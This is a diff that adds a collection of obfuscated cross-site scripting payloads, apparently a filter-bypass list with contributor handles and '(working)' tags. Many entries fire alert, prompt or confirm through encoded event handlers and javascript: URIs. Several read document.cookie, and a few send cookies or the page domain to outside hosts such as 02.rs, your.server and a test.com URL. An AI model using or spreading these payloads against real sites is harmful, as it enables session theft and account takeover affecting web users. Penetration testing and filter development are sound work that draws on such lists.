@@ -1,0 +1,80 @@
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+"+self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain'])//
+";(a=alert,b=1,a(b))//
+"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">
+"><details/open/ontoggle=prompt("/test/")>
+"><img src=1 onmouseleave=print()> - @itsgeekymonk
+"><img src=x onmouseover=prompt&#00000000000000000040;document.cookie&#00000000000000000041;
+"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
+"><svg%20onload=alert%26%230000000040"1")> (working)- @IamRenganathan
+"><svg+svg+svg\/\/On+OnLoAd=confirm(1)> 
+"\/><img s src c=x on onerror  ="alert(1)"
+"onx+%00+onpointerenter%3dalert(domain)+x" (working)- @Brutelogic
+%27%09);%0d%0a%09%09[1].find(alert)//
+%2sscript%2ualert()%2s/script%2u
+'"><script>alert`test`</script><img src=x onerror=alert`test`>
+//Dec: 
+//Hex:
+1'"><img/src/onerror=.1|alert``>
+< svg on onload = ( alert ) ( document.domain ) > r " on onmouseover = ( alert ) ( document.domain ) // r * / eval ?. ( value % 2B / ( / . source ) // " > < input value = confirm autofocus onfocus = ' / * "
+<--%253cimg%20onerror=alert(1)%20src=a%253e --!>
+<--`<img/src=` onerror=confirm``> --!>
+<Svg Only=1 OnLoad=confirm(1)>
+<a HREF='&#7javascrip&#9t:alert&lpar;document.domain)'>
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+<a"/onclick=(confirm)()>Click Here!
+<a"/onclick=(confirm)(document.cookie)>Click Here! 
+<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>
+<a/HREF="Javas%26%2399;ript:%0Athrow onerror=al\u0065rt,document.cooki\u0065">Click Here
+<a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(1)&rpar;>
+<b/style=position:fixed;top:0;left:0;font-size:200px>CSS<
+<div id=x></div> <script> Window.prototype.x.innerHTML='<img src=1 onerror=alert(1)>'; </script>
+<fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074`/AAAA/`>
+<fieldset//.//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074`/AAAA/`>
+<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'>
+<img ignored=() src=x onerror=prompt(1)>
+<img src onerror=&emsp;prompt`${document.domain}`>
+<img src='null' onerror=alert('FalconBrave')>
+<img src=x onError=import('//1152848220/')>
+<img/src=x onError="`${x}`;alert(`Ex.Mi`);"> -@ex_mi
+<logicalhunter/onmouseover=%0aalert%26%230000000096%3b1%26%230000000096%3b>Click Here
+<sVg ...//onsite ONloAd=\u0061\u006C\u0065\u0072\u0074`/AmoloHT/`//>
+<script> onerror=eval,new'\u{22}-alert\u{28}1\u{29}//' </script>
+<select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x>
+<svg on =i onload=alert(domain)
+<svg on =i onload=alert(domain) (working)
+<svg on onload=(alert)(document.domain)>
+<svg on onload=(alert)(document.domain)> -@zapstiko
+<svg onload=%0Aalert1>
+<svg onload=%0Aalert`1`>
+<svg onload=%0Aalert`1`> '
+<svg onload=alert%26%230000000040"")>
+<svg onload=alert%26%230000000040"1")>
+<svg onload=alert&#0000000040"1")>
+<svg onload=alert&#0000000040document.cookie)>
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%230000000040document.domain)> 
+<svg onload=prompt%26%23x000000028;document.domain)>
+<svg onx=() onload=(confirm)(1)>
+<svg onx=() onload=window.alert?.()>
+<svg onx=() onload=window.alert?.()> (working)
+<svg/on%20onload=alert(1)> (working) -@aufzayed
+<svg/onload=location/**/='https://your.server/'+document.domain>
+Dec: <svg onload=prompt%26%230000000040document.domain)>
+Hex: <svg onload=prompt%26%23x000000028;document.domain)>
+\">'>\"><img/src/onerror=confirm(document.cookie)>
+\&#34;+confirm(1)+&#34;
+cookieStore.getAll().then(x=>fetch('//02.rs/'+JSON.stringify(x)))
+document.write(atob(`PHNjcmlwdD5hbGVydChwYXlsb2FkKTwvc2NyaXB0Pg==`));
+java%0dscrip%0d%1b%1bt:console.log`${location=`https://www.test.com?c=${document.cookie}`}`
+javascript:{ alert`0` }
+onfocus=alert&#x00000000028;1&#x00000000029; autofocus>
+test",prompt%0A/*HelloWorld*/(document.domain) (working)- @Brutelogic
+xhzeem"on onmouseover=(alert)(document.domain)//
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+xss'"><iframe srcdoc='&lt;script>;prompt`${document.domain}`&lt;/script>'>
+xss'''><iframe srcdoc='%26it;script>;prompt`${document.domain}`%26it;/script>'>
+x{}</style><xss style="animation-name:x" onanimationend="[].map(alert('xss'))"></xss>> 
+“/><svg/svg/svg/On/OnLoAd/=confirm`1`
+“><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+“><sVg/OnLuFy=”X=y”oNloaD=;1^confirm(1)>/“^1//
